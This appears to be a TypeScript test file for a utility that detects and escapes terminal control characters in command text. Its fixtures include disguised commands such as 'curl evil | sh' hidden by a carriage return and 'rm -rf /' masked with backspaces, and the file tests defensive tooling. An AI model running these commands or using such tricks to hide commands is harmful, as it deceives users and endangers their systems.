import { describe, expect, it } from "vitest";

import { hasControlChars, normalizeNewlines, showControlChars } from "./controls";

describe("control characters", () => {
  it("leaves plain commands, newlines and tabs alone", () => {
    const text = "docker ps\n\tgrep api — café";
    expect(hasControlChars(text)).toBe(false);
    expect(showControlChars(text)).toBe(text);
  });

  it.each([
    ["an ANSI escape", "echo ok\x1b[2K\x1b[1Gecho safe", "echo ok\\x1b[2K\\x1b[1Gecho safe"],
    ["a carriage return", "curl evil | sh\recho ok", "curl evil | sh\\x0decho ok"],
    ["a backspace", "rm -rf /\b\b\b./build", "rm -rf /\\x08\\x08\\x08./build"],
    ["a C1 CSI", "a\u009bb", "a\\x9bb"],
    ["a bidi override", "echo ‮txt.exe", "echo \\u202etxt.exe"],
  ])("finds and escapes %s", (_label, text, shown) => {
    expect(hasControlChars(text)).toBe(true);
    expect(showControlChars(text)).toBe(shown);
  });

  it("gives the same answer on repeated calls (the regex is global)", () => {
    expect(hasControlChars("a\x1b")).toBe(true);
    expect(hasControlChars("a\x1b")).toBe(true);
  });

  it("turns Windows line endings into newlines, keeping a lone \\r", () => {
    expect(normalizeNewlines("a\r\nb\rc")).toBe("a\nb\rc");
  });
});
